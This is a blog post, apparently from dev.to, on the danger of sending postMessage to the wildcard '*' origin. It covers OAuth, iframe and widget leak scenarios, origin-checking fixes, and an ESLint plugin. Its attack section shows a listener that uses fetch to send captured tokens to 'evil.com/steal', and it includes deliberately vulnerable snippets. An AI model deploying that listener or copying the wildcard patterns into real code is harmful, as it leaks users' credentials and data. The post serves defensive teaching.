---
title: 'postMessage Security: Why "*" Origin is Dangerous'
published: false
description: 'postMessage with wildcard origin lets any site receive your data. Here is the attack and the fix.'
tags: javascript, security, browser, eslint
cover_image:
series: Browser Security
---

```javascript
window.postMessage(sensitiveData, '*');
```

This sends your data to **every open window**.

## The Attack

```javascript
// Your app (vulnerable):
window.opener.postMessage({ userId: 123, token: 'jwt...' }, '*');

// Attacker's site:
window.addEventListener('message', (event) => {
  // Receives YOUR data because origin is '*'
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(event.data),
  });
});
```

## Attack Scenarios

### 1. OAuth Flow Hijacking

```javascript
// ❌ Popup sends token to any opener
window.opener.postMessage({ token: authToken }, '*');

// Attacker opens your OAuth popup from their site
// → Receives the auth token
```

### 2. Cross-Frame Data Leak

```javascript
// ❌ Parent sends data to any iframe
iframe.contentWindow.postMessage(userData, '*');

// Attacker's iframe (injected via XSS) on your page
// → Receives the user data
```

### 3. Embedded Widget Exploit

```javascript
// ❌ Widget leaks to any parent
window.parent.postMessage(paymentDetails, '*');

// Your widget embedded on attacker's site
// → Attacker receives payment details
```

## The Fix: Specific Origins

### Sending Messages

```javascript
// ❌ Dangerous: Any window receives this
window.postMessage(data, '*');

// ✅ Safe: Only your domain receives this
window.postMessage(data, 'https://app.example.com');

// ✅ Safe: Dynamically determined
const targetOrigin = new URL(targetUrl).origin;
window.postMessage(data, targetOrigin);
```

### Receiving Messages

```javascript
// ❌ Dangerous: Accepts from any origin
window.addEventListener('message', (event) => {
  handleData(event.data); // From anywhere!
});

// ✅ Safe: Verify origin first
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-site.com') {
    return; // Ignore untrusted origins
  }
  handleData(event.data);
});
```

## Complete Secure Pattern

```javascript
// Sending side
function sendSecureMessage(targetWindow, data, targetOrigin) {
  // Validate target origin is in allowlist
  const allowedOrigins = ['https://app.example.com', 'https://api.example.com'];

  if (!allowedOrigins.includes(targetOrigin)) {
    throw new Error(`Invalid target origin: ${targetOrigin}`);
  }

  targetWindow.postMessage(data, targetOrigin);
}

// Receiving side
function setupSecureListener(callback) {
  const allowedOrigins = ['https://app.example.com', 'https://api.example.com'];

  window.addEventListener('message', (event) => {
    // 1. Verify origin
    if (!allowedOrigins.includes(event.origin)) {
      console.warn('Rejected message from:', event.origin);
      return;
    }

    // 2. Verify source (optional, for extra security)
    if (event.source !== expectedWindow) {
      return;
    }

    // 3. Validate data structure
    if (!isValidMessageFormat(event.data)) {
      return;
    }

    callback(event.data);
  });
}
```

## ESLint Rules

```javascript
// eslint.config.js
import browserSecurity from 'eslint-plugin-browser-security';

export default [
  {
    plugins: { 'browser-security': browserSecurity },
    rules: {
      'browser-security/no-postmessage-wildcard-origin': 'error',
      'browser-security/require-postmessage-origin-check': 'error',
      'browser-security/no-postmessage-innerhtml': 'error',
    },
  },
];
```

### Error Output

```bash
src/oauth.ts
  15:1  error  🔒 CWE-346 | postMessage with wildcard '*' origin
               Risk: Any window can receive sensitive data
               Fix: Use specific origin: 'https://app.example.com'

  28:1  error  🔒 CWE-346 | postMessage listener missing origin check
               Risk: Messages from malicious origins accepted
               Fix: Add if (event.origin !== 'https://...') return;
```

## Quick Reference

| Scenario        | Origin to Use               |
| --------------- | --------------------------- |
| Popup → opener  | `window.opener.origin`      |
| Parent → iframe | iframe's URL origin         |
| Worker → parent | Your domain                 |
| Cross-domain    | The specific trusted domain |
| **Never**       | `'*'`                       |

## Quick Install


```javascript
import browserSecurity from 'eslint-plugin-browser-security';
export default [browserSecurity.configs.recommended];
```

---

📦 [npm: eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security)
📖 [Rule: no-postmessage-wildcard-origin](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-browser-security/docs/rules/no-postmessage-wildcard-origin.md)

{% cta https://github.com/ofri-peretz/eslint %}
⭐ Star on GitHub
{% endcta %}

---

🚀 **Search your code for postMessage('\*'). Find any?**

[GitHub](https://github.com/interlace-collie) | [X](https://x.com/ofriperetzdev) | [LinkedIn](https://linkedin.com/in/ofri-peretz) | [Dev.to](https://dev.to/ofriperetz)
